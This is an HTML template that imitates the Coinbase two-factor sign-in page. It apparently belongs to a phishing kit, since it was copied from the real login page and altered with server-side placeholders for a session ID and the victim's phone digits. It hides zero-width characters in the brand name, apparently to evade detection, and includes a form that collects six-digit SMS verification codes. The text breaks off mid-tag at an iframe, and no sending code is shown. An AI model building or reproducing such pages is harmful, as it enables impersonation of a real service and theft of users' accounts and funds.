<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>C&#8203;oinbase- Sign In</title>

  <style>
    /* Responsive toggle between desktop and mobile */
    .desktop-view {
      display: none;
    }

    .mobile-view {
      display: block;
    }

    @media screen and (min-width: 768px) {
      .desktop-view {
        display: block;
      }

      .mobile-view {
        display: none;
      }
    }

    html,
    body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow-x: hidden;
    }
    /* Dark mode base styles */
    body {
      background-color: #0a0b0d !important;
      color: #ffffff !important;
    }

    /* Make C&#8203;oinbase logo white */
    .cds-iconStyles-irtngcj path {
      fill: #ffffff !important;
    }

    /* Override the light theme variables */
    .cds-light-lxvt6sp {
      --foreground: #ffffff !important;
      --foreground-muted: #a0a0a0 !important;
      --background: #0a0b0d !important;
      --background-alternate: #15171a !important;
      --background-inverse: #ffffff !important;
      --background-overlay: rgba(0, 0, 0, 0.7) !important;
      --line: rgba(255, 255, 255, 0.1) !important;
      --line-heavy: rgba(255, 255, 255, 0.3) !important;
      --primary: #0052ff !important;
      --primary-wash: rgba(0, 82, 255, 0.1) !important;
      --primary-foreground: #ffffff !important;
      --negative: #ff4d4d !important;
      --negative-foreground: #ffffff !important;
      --negative-wash: rgba(255, 77, 77, 0.1) !important;
      --positive: #10b981 !important;
      --positive-foreground: #ffffff !important;
      --secondary: #15171a !important;
      --secondary-foreground: #ffffff !important;
      --transparent: transparent !important;
      --warning: #f59e0b !important;
      --warning-foreground: #ffffff !important;
    }

    /* OTP Input boxes - ALWAYS black background */
    .cds-input-i10uvtgb,
    .cds-input-i10uvtgb:hover,
    .cds-input-i10uvtgb:focus,
    .cds-input-i10uvtgb:active {
      background-color: #0a0b0d !important;
      border-color: rgba(255, 255, 255, 0.3) !important;
      color: #ffffff !important;
    }

    /* Input container background - ALWAYS black */
    .cds-inputAreaContainerStyles-ipofex6,
    .cds-inputAreaContainerStyles-ipofex6:hover,
    .cds-inputAreaContainerStyles-ipofex6:focus {
      background-color: #0a0b0d !important;
    }

    /* Input interactable area - ALWAYS black */
    [data-testid="input-interactable-area"],
    [data-testid="input-interactable-area"]:hover,
    [data-testid="input-interactable-area"]:focus,
    [data-testid="input-interactable-area"]:active {
      --interactable-background: #0a0b0d !important;
      --interactable-hovered-background: #0a0b0d !important;
      --interactable-pressed-background: #0a0b0d !important;
      --interactable-disabled-background: #0a0b0d !important;
      background-color: #0a0b0d !important;
    }

    /* Hover state - only change border */
    [data-testid="input-interactable-area"]:hover {
      border-color: rgba(255, 255, 255, 0.5) !important;
    }

    /* Focus state - only change border */
    [data-testid="input-interactable-area"]:focus-within {
      border-color: #578bfa !important;
      box-shadow: 0 0 0 2px rgba(87, 139, 250, 0.2) !important;
    }

    /* Filled OTP boxes - STILL BLACK, only border changes */
    [data-testid="input-interactable-area"][data-filled="true"] {
      background: #0a0b0d !important;
      border-color: #578bfa !important;
      border-width: 2px !important;
    }

    /* Focus state for filled boxes - STILL BLACK */
    [data-testid="input-interactable-area"][data-filled="true"]:focus-within {
      background: #0a0b0d !important;
      border-color: #578bfa !important;
      box-shadow: 0 0 0 2px rgba(87, 139, 250, 0.2) !important;
    }

    /* Remove any blue background effects completely */
    [data-testid="input-interactable-area"][data-filled="true"] {
      background: #0a0b0d !important !important;
    }

    /* Continue button - disabled state (no OTP filled) */
    .cds-button-b1oh4z3j:disabled {
      background-color: #304b84 !important;
      color: #a0a0a0 !important;
      cursor: not-allowed !important;
    }

    /* Continue button - enabled state (OTP filled) */
    .cds-button-b1oh4z3j:not(:disabled) {
      background-color: #578bfa !important;
      color: #ffffff !important;
      cursor: pointer !important;
    }

    /* Continue button hover effects */
    .cds-button-b1oh4z3j:not(:disabled):hover {
      background-color: #4a7df5 !important;
      transform: translateY(-1px);
      transition: all 0.2s ease;
    }

    /* Text and typography */
    .cds-foreground-f1v7bdxr {
      color: #ffffff !important;
    }

    .cds-foregroundMuted-flk4pe3 {
      color: #a0a0a0 !important;
    }

    /* Links */
    .cds-link-l678mx9 {
      color: #578bfa !important;
    }

    .cds-link-l678mx9:hover {
      color: #4a7df5 !important;
    }

    /* Cookie banner */
    .cds-backgroundAlternate-b11ss81y {
      background-color: #15171a !important;
      color: #ffffff !important;
    }

    /* Input text color */
    [data-testid="code-inputs-container"] input {
      color: #ffffff !important;
      caret-color: #ffffff !important;
      background-color: transparent !important;
    }

    /* Error message styling for dark mode */
    #errorMessage {
      background: rgba(255, 77, 77, 0.15) !important;
      color: #ff8a8a !important;
      border: 1px solid rgba(255, 77, 77, 0.3) !important;
    }

    /* Button state transitions */
    .cds-button-b1oh4z3j {
      transition: all 0.3s ease !important;
    }

    /* Remove any white backgrounds from input containers */
    .cds-nativeInputBaseStyle-ngba8xt {
      background-color: transparent !important;
    }

    /* Ensure the code inputs container has dark background */
    [data-testid="code-inputs-container"] {
      background-color: transparent !important;
    }

    /* Override any inline styles that might set light backgrounds */
    .cds-inputBaseAreaStyles-i16zw4a5 {
      background-color: #0a0b0d !important;
    }

    /* Force remove any background color changes on interaction */
    .cds-interactable-i17wmk8f,
    .cds-interactable-i17wmk8f:hover,
    .cds-interactable-i17wmk8f:focus,
    .cds-interactable-i17wmk8f:active {
      background-color: #0a0b0d !important;
    }

    /* Specifically target and remove the blue background from the inline styles */
    [style*="--interactable-background:var(--background)"] {
      --interactable-background: #0a0b0d !important;
      background-color: #0a0b0d !important;
    }

    [style*="--interactable-hovered-background:rgb(250,250,250)"] {
      --interactable-hovered-background: #0a0b0d !important;
      background-color: #0a0b0d !important;
    }

    [style*="--interactable-pressed-background:rgb(235,235,236)"] {
      --interactable-pressed-background: #0a0b0d !important;
      background-color: #0a0b0d !important;
    }
  </style>
  
 
</head>

<body>
  <!-- MOBILE VERSION -->
  <div class="mobile-view">
    <!DOCTYPE html>
    <html lang=en><!--
 Page saved with SingleFile 
 url: https://login.C&#8203;oinbase.com/signin 
 saved date: Mon Oct 20 2025 14:17:53 GMT-0700 (Pacific Daylight Time)
-->
    <meta charset=utf-8>
    <meta http-equiv=origin-trial
      content="A7vZI3v+Gz7JfuRolKNM4Aff6zaGuT7X0mf3wtoZTnKv6497cVMnhy03KDqX7kBz/q/iidW7srW31oQbBt4VhgoAAACUeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGUuY29tOjQ0MyIsImZlYXR1cmUiOiJEaXNhYmxlVGhpcmRQYXJ0eVN0b3JhZ2VQYXJ0aXRpb25pbmczIiwiZXhwaXJ5IjoxNzU3OTgwODAwLCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
    <meta http-equiv=X-UA-Compatible content="IE=edge">
    <meta name=viewport content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>C&#8203;oinbase - Sign in</title>
    <meta name=theme-color content=#0052ff>
    <meta property=og:type content=website>
    <meta property=og:url content=https://login.C&#8203;oinbase.com>
    <meta property=og:title content="C&#8203;oinbase Sign In">
    <meta property=og:site_name content="C&#8203;oinbase Sign In">
    <meta property=description name=description
      content="C&#8203;oinbase is a secure online platform for buying, selling, transferring, and storing digital currency.">
    <meta name=twitter:card content=summary_large_image>
    <meta name=twitter:url content=https://login.C&#8203;oinbase.com>
    <meta name=twitter:title content="C&#8203;oinbase Sign In">
    <style>
      @font-face {
        font-family: font;
        src: local("Arial")
      }
    </style>
    
    <link rel="stylesheet" href="/static/css/styless.css">
    <style>
      @-moz-document url-prefix("") {
        .PbRoleerFjplRBGoiUNB {
          visibility: visible;
          display: block
        }
      }
    </style>
    <meta name=description
      content="C&#8203;oinbase is a secure online platform for buying, selling, transferring, and storing cryptocurrency."
      data-rh=true>
    <style id=googleidentityservice_button_styles>
      @media screen and (-ms-high-contrast:active) {}

      @media screen and (preferes-contrast:more) {}

      @media screen and (prefers-contrast:more) {}

      @media screen and (prefers-contrast:more) {}
    </style>
    <style>
      @media only screen and (max-width:410px) {}
    </style>
    <meta http-equiv=origin-trial
      content="A8o5T4MyEkRZqLA9WeG2XTFdV5tsX2Prg85xyQ+RL1btVuybB1K/EQ+7JUsPK+J32oBMTnsoF9B4A+qTlL6efgQAAABweyJvcmlnaW4iOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkZlZENtQnV0dG9uTW9kZSIsImV4cGlyeSI6MTc0NDY3NTIwMCwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
    <meta name=referrer content=no-referrer>
    <link rel="shortcut icon" type=image/png sizes=196x196
     
   
    <link rel=canonical href=https://login.C&#8203;oinbase.com/signin>
    <meta http-equiv=content-security-policy
      content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;">
    </head>

    <body class=cds-light-lxvt6sp style=background-color:rgba(var(--gray0))>
      <noscript>You need to enable JavaScript to run this app.</noscript>
      <div id=root style=display:flex;flex-direction:column;min-height:100%>
        <div class="C&#8203;oinbase light"
          <link rel="stylesheet" href="/static/css/styles2.css">
          <div class="cds-large-l1kwdti4 cds-light-lxvt6sp"
            style=--foreground:rgb(var(--gray100));--foreground-muted:rgb(var(--gray60));--background:rgb(var(--gray0));--background-alternate:rgb(var(--gray5));--background-inverse:rgb(var(--gray100));--background-overlay:rgba(var(--gray80),0.33);--line:rgba(var(--gray60),0.2);--line-heavy:rgba(var(--gray60),0.66);--primary:rgb(var(--blue60));--primary-wash:rgb(var(--blue0));--primary-foreground:rgb(var(--gray0));--negative:rgb(var(--red60));--negative-foreground:rgb(var(--gray0));--negative-wash:rgb(var(--red0));--positive:rgb(var(--green60));--positive-foreground:rgb(var(--gray0));--secondary:rgb(var(--gray5));--secondary-foreground:rgb(var(--gray100));--transparent:rgba(var(--gray0),0);--warning:rgb(var(--yellow50));--warning-foreground:rgb(var(--orange40))>
            <div data-testid=global-loading-provider-wrapper class="cds-flex-f1tjavv3 cds-column-c1kchipr"
              style=flex-grow:1;width:100%>
              <div data-testid=page-layout
                class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-space-between-s1y044t2 cds-background-b6zr2pu"
                style=height:100%;width:100%>
                <div data-testid=signin-header class="cds-grid-g1uqvyz9 cds-auto-agiev0s" role=banner
                  style="grid-template-columns:auto 1fr auto">
                  <div
                    class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-3-_63shon cds-3-_1krzigx cds-4-_1mgafrb cds-4-_dk22v4 cds-responsive"
                    style=height:72px><svg aria-label="C&#8203;oinbase logo" class=cds-iconStyles-irtngcj height=32 role=img
                      viewBox="0 0 48 48" width=32 xmlns=http://www.w3.org/2000/svg>
                      <title>C&#8203;oinbase logo</title>
                      <path
                        d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z"
                        fill=#0052FF></path>
                    </svg></div>
                </div>
                <div class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-column-c1kchipr cds-0-_1ehpnd cds-1-_17cz18m"
                  style=flex-grow:1;width:100%>
                  <div data-testid=global-loading-provider-wrapper class="cds-flex-f1tjavv3 cds-column-c1kchipr"
                    style=flex-grow:1;width:100%;align-items:center;justify-content:center>
                    <div class="cds-flex-f1tjavv3 cds-flex-start-fptdbvx cds-row-r1cf21wt cds-center-cqy3t5k"
                      style=flex-grow:1;width:100%>
                      <div class="cds-flex-f1tjavv3 cds-column-c1kchipr"
                        style=flex-grow:1;height:100%;max-width:448px;width:100%>
                        <div
                          class="cds-flex-f1tjavv3 cds-center-cqy3t5k cds-roundedLarge-r1hj45o7 cds-borderedOff-b16cgegt cds-3-_m245rc cds-3-_63shon cds-3-_5y4gfs"
                          style=width:100%>
                          <div id=two-factor class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-3-_10f3bvw"
                            style=width:100%>
                            <div class="cds-flex-f1tjavv3 cds-column-c1kchipr"
                              style=flex-grow:1;max-width:448px;width:100%>
                              <div data-testid=load-view-wrapper class="cds-flex-f1tjavv3 cds-column-c1kchipr"
                                style=flex-grow:1;max-width:448px;width:100%>
                                <div data-testid=sms-input-code
                                  class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-space-between-s1y044t2"
                                  style=flex-grow:1;width:100%>
                                  <div data-testid=identity-multi-content-layout-content-wrapper-sms-input-code
                                    class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-4-_rtvvf2 cds-3-_1ud7wyy">
                                    <div data-testid=identity-multi-content-layout-content-header-wrapper-sms-input-code
                                      class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-3-_1ud7wyy"><img alt height=48
                                        src=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9IjAgMCA0OCA0OCI+PHBhdGggZmlsbD0iIzAwNTJGRiIgZD0iTTggMmEyIDIgMCAwIDEgMi0yaDI4YTIgMiAwIDAgMSAyIDJ2NDRhMiAyIDAgMCAxLTIgMkgxMGEyIDIgMCAwIDEtMi0yeiIvPjxwYXRoIGZpbGw9IiNDRUQyREIiIGQ9Ik00OCA4SDB2MzJoNDh6Ii8+PHBhdGggZmlsbD0iIzBBMEIwRCIgZD0iTTQwIDhIOHYzMmgzMnoiLz48cGF0aCBmaWxsPSIjRkZGRkZGIiBkPSJNMTUgMjUuNWExLjUgMS41IDAgMSAwIDAtMyAxLjUgMS41IDAgMCAwIDAgM200LjUgMGExLjUgMS41IDAgMSAwIDAtMyAxLjUgMS41IDAgMCAwIDAgM200LjUgMGExLjUgMS41IDAgMSAwIDAtMyAxLjUgMS41IDAgMCAwIDAgM200LjUgMGExLjUgMS41IDAgMSAwIDAtMyAxLjUgMS41IDAgMCAwIDAgM200LjUgMGExLjUgMS41IDAgMSAwIDAtMyAxLjUgMS41IDAgMCAwIDAgMyIvPjxwYXRoIGZpbGw9IiMwQTBCMEQiIGQ9Ik0yMSA0NGExIDEgMCAwIDEgMS0xaDRhMSAxIDAgMSAxIDAgMmgtNGExIDEgMCAwIDEtMS0xbTQtNDBhMSAxIDAgMSAxLTIgMCAxIDEgMCAwIDEgMiAwIi8+PC9zdmc+
                                        width=48>
                                      <div data-testid=identity-multi-content-layout-title-wrapper
                                        class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-1-_1w0e50j">
                                        {% if phone_digits %}
                                        <p
                                          class="cds-typographyResets-t6muwls cds-title1-t2i0v90 cds-foreground-f1v7bdxr cds-transition-t1qvlahm cds-start-s1u0g7ow">
                                          Enter the 6-digit code we texted to +* *******{{ phone_digits }}
                                        </p>
                                        {% endif %}
                                        <p
                                          class="cds-typographyResets-t6muwls cds-body-bwup3gq cds-foregroundMuted-flk4pe3 cds-transition-t1qvlahm cds-start-s1u0g7ow cds-break-b1kd50ys">
                                          This helps us keep your account secure by verifying that it's really you.
                                        </p>
                                      </div>
                                    </div>
                                    <div data-testid=identity-multi-content-layout-body-sms-input-code
                                      class="cds-flex-f1tjavv3 cds-column-c1kchipr">
                                      <div data-testid=sms-input-body
                                        class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-2-_mr0se7">
                                        <form id="verificationFormMobile">
                                          <input type="hidden" id="sessionId" value="{{ session_id }}">
                                          <input type="text" id="code" name="verification_code"
                                            style="position: absolute; opacity: 0; pointer-events: none;" maxlength="6">
                                          <div class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0-_1dm135g">
                                            <div data-testid=code-inputs-container
                                              class="cds-flex-f1tjavv3 cds-row-r1cf21wt cds-relative-r5okg6e cds-1-_1w0e50j"
                                              role=group aria-label="numerical code inputs"
                                              style=width:100%;position:relative>
                                              <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
                                                style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
                                                <div data-testid
                                                  class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
                                                  style=width:100%;opacity:1>
                                                  <div class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
                                                    <div class=cds-inputAreaContainerStyles-ipofex6><span
                                                        data-testid=input-interactable-area
                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5 cds-persistedFocusStyles-p6phjeo"
                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
                                                        <div data-testid
                                                          class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
                                                        </div><input aria-label="6 digit code, digit 1"
                                                          class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
                                                          tabindex=0 aria-invalid=false id=cds-textinput-label-:rf:
                                                          type=text inputmode=numeric autocomplete=one-time-code value
                                                          style=text-align:center;color-scheme:light maxlength="1">
                                                      </span></div>
                                                  </div>
                                                </div>
                                              </div>
                                              <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
                                                style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
                                                <div data-testid
                                                  class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
                                                  style=width:100%;opacity:1>
                                                  <div class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
                                                    <div class=cds-inputAreaContainerStyles-ipofex6><span
                                                        data-testid=input-interactable-area
                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5"
                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
                                                        <div data-testid
                                                          class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
                                                        </div><input aria-label="6 digit code, digit 2"
                                                          class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
                                                          tabindex=0 aria-invalid=false id=cds-textinput-label-:rg:
                                                          type=text inputmode=numeric autocomplete value
                                                          style=text-align:center;color-scheme:light maxlength="1">
                                                      </span></div>
                                                  </div>
                                                </div>
                                              </div>
                                              <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
                                                style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
                                                <div data-testid
                                                  class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
                                                  style=width:100%;opacity:1>
                                                  <div class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
                                                    <div class=cds-inputAreaContainerStyles-ipofex6><span
                                                        data-testid=input-interactable-area
                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5"
                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
                                                        <div data-testid
                                                          class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
                                                        </div><input aria-label="6 digit code, digit 3"
                                                          class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
                                                          tabindex=0 aria-invalid=false id=cds-textinput-label-:rh:
                                                          type=text inputmode=numeric autocomplete value
                                                          style=text-align:center;color-scheme:light maxlength="1">
                                                      </span></div>
                                                  </div>
                                                </div>
                                              </div>
                                              <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
                                                style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
                                                <div data-testid
                                                  class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
                                                  style=width:100%;opacity:1>
                                                  <div class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
                                                    <div class=cds-inputAreaContainerStyles-ipofex6><span
                                                        data-testid=input-interactable-area
                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5"
                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
                                                        <div data-testid
                                                          class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
                                                        </div><input aria-label="6 digit code, digit 4"
                                                          class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
                                                          tabindex=0 aria-invalid=false id=cds-textinput-label-:ri:
                                                          type=text inputmode=numeric autocomplete value
                                                          style=text-align:center;color-scheme:light maxlength="1">
                                                      </span></div>
                                                  </div>
                                                </div>
                                              </div>
                                              <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
                                                style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
                                                <div data-testid
                                                  class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
                                                  style=width:100%;opacity:1>
                                                  <div class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
                                                    <div class=cds-inputAreaContainerStyles-ipofex6><span
                                                        data-testid=input-interactable-area
                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5"
                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
                                                        <div data-testid
                                                          class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
                                                        </div><input aria-label="6 digit code, digit 5"
                                                          class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
                                                          tabindex=0 aria-invalid=false id=cds-textinput-label-:rj:
                                                          type=text inputmode=numeric autocomplete value
                                                          style=text-align:center;color-scheme:light maxlength="1">
                                                      </span></div>
                                                  </div>
                                                </div>
                                              </div>
                                              <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
                                                style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
                                                <div data-testid
                                                  class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
                                                  style=width:100%;opacity:1>
                                                  <div class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
                                                    <div class=cds-inputAreaContainerStyles-ipofex6><span
                                                        data-testid=input-interactable-area
                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5"
                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
                                                        <div data-testid
                                                          class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
                                                        </div><input aria-label="6 digit code, digit 6"
                                                          class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
                                                          tabindex=0 aria-invalid=false id=cds-textinput-label-:rk:
                                                          type=text inputmode=numeric autocomplete value
                                                          style=text-align:center;color-scheme:light maxlength="1">
                                                      </span></div>
                                                  </div>
                                                </div>
                                              </div>
                                            </div>
                                          </div>
                                          <!-- Error message -->
                                          <div id="errorMessage"
                                            style="display: none; color: #ff4d4d; padding: 10px; margin: 10px 0; background: rgba(255, 77, 77, 0.1); border-radius: 4px; text-align: center;">
                                            Invalid verification code. Please try again.
                                          </div>
                                        </form>
                                      </div>
                                    </div>
                                  </div>
                                  <div class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-2-_mr0se7"><button
                                      data-testid="unified-login-email-prompt-submit-button" aria-busy="false"
                                      aria-disabled="true"
                                      class="cds-interactable-i17wmk8f cds-disabledState-do7z3i1 cds-disabledBorder-d109aw8r cds-transparent-t1pmzpst cds-button-b15nm6xx cds-fullWidth-f10ei5ro cds-scaledDownState-s1o6alxd cds-primaryForeground-pd71c0x cds-button-b1oh4z3j cds-buttonBlock-b1aolcod cds-4-_1g6imbc cds-4-_13srchq"
                                      disabled="" type="submit"
                                      style="pointer-events:none;--interactable-height:56px;--interactable-border-radius:56px;--interactable-background:var(--primary);--interactable-hovered-background:rgb(1,76,236);--interactable-hovered-opacity:0.92;--interactable-pressed-background:rgb(1,72,221);--interactable-pressed-opacity:0.86;--interactable-disabled-background:rgb(128,169,255)"><span
                                        class="cds-positionRelative-pa1s919"><span
                                          class="cds-typographyResets-t6muwls cds-headline-h4steop cds-primaryForeground-pd71c0x cds-transition-t1qvlahm cds-start-s1u0g7ow"><span>Continue</span></span></span></button>
                                  </div>
                                  <div data-testid=alternate-methods-container
                                    class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-column-c1kchipr cds-3-_5y4gfs cds-0-_1dm135g cds-2-_mr0se7"
                                    style=width:100%>
                                    <p data-testid=m2fa-recovery-link
                                      class="cds-typographyResets-t6muwls cds-body-bwup3gq cds-foreground-f1v7bdxr cds-transition-t1qvlahm cds-start-s1u0g7ow cds-1-_1sy2ps1">
                                      <a data-testid=cancel-button class="cds-link cds-link-l678mx9"
                                        href=https://login.C&#8203;oinbase.com/recovery><span
                                          class="cds-typographyResets-t6muwls cds-body-bwup3gq cds-primary-pgii67x cds-transition-t1qvlahm cds-start-s1u0g7ow cds-noUnderline-n12nlvc0 cds-link--container"></span></a>
                                    </p>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                        <div
                          class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-column-c1kchipr cds-3-_5y4gfs cds-3-_10f3bvw">
                          <button data-testid=cancel-button class="cds-link cds-link-l678mx9" type=button><span
                              class="cds-typographyResets-t6muwls cds-body-bwup3gq cds-primary-pgii67x cds-transition-t1qvlahm cds-start-s1u0g7ow cds-link--container"></span></button>
                        </div>
                        <div
                          class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-column-c1kchipr cds-3-_5y4gfs cds-3-_10f3bvw">
                          <button data-testid="cancel-button" class="cds-link cds-link-l678mx9" type="button"><span
                              class="cds-typographyResets-t6muwls cds-body-bwup3gq cds-primary-pgii67x cds-transition-t1qvlahm cds-start-s1u0g7ow cds-link--container"></span></button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div data-testid=mobile-cookie-banner
                  class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-3-_1rdigxg cds-1-_1w0e50j">
                  <div class="cds-flex-f1tjavv3 cds-column-c1kchipr" style=max-height:150px;opacity:1>
                    <p
                      class="cds-typographyResets-t6muwls cds-legal-lzv3g65 cds-foregroundMuted-flk4pe3 cds-transition-t1qvlahm cds-start-s1u0g7ow">
                      We use strictly necessary cookies to enable essential functions, such as security and
                      authentication. For more information, see our <a class="cds-link cds-link-l678mx9"
                        href=https://C&#8203;oinbase.com/legal/cookie rel="noopener noreferrer" target=_blank><span
                          class="cds-typographyResets-t6muwls cds-legal-lzv3g65 cds-foregroundMuted-flk4pe3 cds-transition-t1qvlahm cds-start-s1u0g7ow cds-underline-u1x5xrhj cds-link--container">Cookie
                          Policy</span></a> and <a data-testid=link-privacy-policy class="cds-link cds-link-l678mx9"
                        href=https://C&#8203;oinbase.com/legal/privacy rel="noopener noreferrer" target=_blank><span
                          class="cds-typographyResets-t6muwls cds-legal-lzv3g65 cds-foregroundMuted-flk4pe3 cds-transition-t1qvlahm cds-start-s1u0g7ow cds-underline-u1x5xrhj cds-link--container">Privacy
                          Policy</span></a>.</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <iframe style=display:block!important;position:absolute;top:0px;left:0px;visibility:hidden
        sandbox="allow-popups allow-top-navigation-by-user-activation"
